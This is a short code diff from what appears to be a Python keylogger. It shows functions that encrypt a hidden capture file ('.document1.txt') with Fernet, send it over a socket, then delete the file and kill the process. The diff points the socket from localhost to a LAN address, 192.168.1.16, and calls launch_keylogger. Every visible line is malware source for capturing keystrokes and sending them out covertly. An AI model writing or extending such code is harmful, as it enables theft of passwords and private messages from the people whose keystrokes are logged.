@@ -28,7 +28,7 @@ def kill_server():
         os.kill(os.getpid(), signal.SIGINT)
 
 def stop_and_delete_capture_file():
-    file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
+    file = ".document1.txt" 
     os.remove(file)
     kill_server()
 
@@ -51,15 +51,16 @@ def send_file_securely(client_socket):
             lines = file.read()
             encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
             client_socket.send(encrypted_lines)
+            file.close()
+            del file
             
     finally:
         client_socket.close()
 
 if __name__ == "__main__":
-
-
-    mysocket = get_socket("127.0.0.1", 12345)
+    mysocket = get_socket("192.168.1.16", 12345)
     launch_keylogger(mysocket)
+
     """
     try:
         send_file_securely(mysocket)
